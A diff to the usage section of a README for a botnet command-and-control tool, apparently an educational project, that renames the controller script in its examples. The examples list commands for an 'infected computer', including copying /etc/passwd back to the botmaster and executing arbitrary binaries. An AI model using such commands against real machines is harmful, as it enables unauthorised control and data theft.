@@ -89,31 +89,31 @@ You can only use one command option at a time. See the source code for more adva
 #### Examples
 - Ping the bot
     ```bash
-    python bot/bot.py --announce 
+    python bot/controller.py --announce 
     ```
 - List users currently present on the infected computer
     ```bash
-    python bot/bot.py --list-users
+    python bot/controller.py --list-users
     ```
 - List directories in the specified path (Path should be absolute) 
     ```bash
-    python bot/bot.py --list-dir /tmp/
+    python bot/controller.py --list-dir /tmp/
     ```
 - Get the user ID of the Bot (the output of the `id` command) 
     ```bash
-    python bot/bot.py --user-id
+    python bot/controller.py --user-id
     ```
 - Copy a file from the infected computer to Botmaster's specified by path (path should be absolute and bot should have permissions to that path). Note: In this, not very wise implementation is the file sent directly in one packet without splitting it into chunks. The output on Botmaster's machine is via console, which is also not very fortunate. 
     ```bash
-    python bot/bot.py --copy-file /etc/passwd
+    python bot/controller.py --copy-file /etc/passwd
     ```
 - Execute a binary specified by path (Path should be absolute and the bot should have permissions to run the binary; binary should be executable) 
     ```bash
-    python bot/bot.py --exec-binary /usr/bin/ps
+    python bot/controller.py --exec-binary /usr/bin/ps
     ```
 - Kill the bot 
     ```bash
-    python bot/bot.py --kill
+    python bot/controller.py --kill
     ```
 
 ## Security Features
